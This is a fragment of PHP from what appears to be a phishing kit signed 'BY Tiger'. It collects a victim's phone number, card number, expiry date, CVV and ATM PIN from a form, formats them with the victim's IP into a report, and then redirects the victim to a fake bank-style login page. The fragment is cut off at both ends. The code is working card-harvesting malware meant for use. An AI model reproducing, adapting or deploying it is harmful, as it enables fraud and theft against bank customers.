...
❤ <font style='color: #000f82;'>BY Tiger </font> ❤<br/>
================( <font style='color: #0a5d00;'>INFO USER CARD ".$ip."</font> )================<br>
<font style='color:#00049c;'>🤑✪</font> [TELE] = <font style='color:#ba0000;'>".$_POST['tele']."</font><br>
<font style='color:#00049c;'>🤑✪</font> [CARD] = <font style='color:#ba0000;'>".$_POST['card']."</font><br>
<font style='color:#00049c;'>🤑✪</font> [DATE] = <font style='color:#ba0000;'>".$_POST['date']."</font><br>
<font style='color:#00049c;'>🤑✪</font> [CVV ] = <font style='color:#ba0000;'>".$_POST['cvv']."</font><br>
<font style='color:#00049c;'>🤑✪</font> [PIN ] = <font style='color:#ba0000;'>".$_POST['atm']."</font><br>
...
HEADER("Location: ../continuar.php?assure_nfpb=true&_pageLabel=as_login_page&connexioncompte_2actionEvt=afficher&lieu.x=fr_".$rand."&".md5(microtime())."");
